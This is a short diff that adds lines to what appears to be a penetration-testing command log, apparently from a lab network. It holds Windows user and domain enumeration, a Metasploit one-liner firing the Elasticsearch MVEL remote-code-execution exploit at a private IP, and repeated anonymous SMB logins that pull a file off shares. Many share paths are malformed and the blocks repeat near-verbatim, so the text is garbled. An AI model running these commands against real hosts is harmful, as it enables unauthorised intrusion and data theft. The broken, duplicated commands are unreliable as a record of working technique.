@@ -5,3 +5,28 @@ net user
 net user /domain
 dir
 msfconsole -q -x "use exploit/multi/elasticsearch/script_mvel_rce; set rhosts 192.168.52.60; exploit;"
+msfconsole -q -x "use exploit/multi/elasticsearch/script_mvel_rce; set rhosts 192.168.52.60; exploit;"
+smbclient \\\\192.168.52.4\\192.168.52.1-100/combined/192.168.52.4/shares/all.dbs_MysteryEgg -U anonymous -N
+dir
+get filex
+\n smbclient \\\\192.168.52.4\\192.168.52.1-100/combined/192.168.52.4/shares/all.dbs_MysteryEgg -U anonymous -N
+dir
+get filex
+smbclient \\\\192.168.52.4\\ -U anonymous -N
+dir
+get filex
+smbclient \\\\192.168.52.4\\192.168.52.1-100/combined/192.168.52.4/shares/all.dbs_MysteryEgg -U anonymous -N
+dir
+get filex
+smbclient \\\\192.168.52.4\\192.168.52.1-100/combined/192.168.52.4/shares/all.dbs_MysteryEgg -U anonymous -N
+dir
+get filex
+smbclient \\\\192.168.52.4\\ -U anonymous -N
+dir
+get filex
+smbclient \\\\192.168.52.4\\ -U anonymous -N
+dir
+get filex
+smbclient \\\\192.168.52.4\\MysteryEgg -U anonymous -N
+dir
+get filex
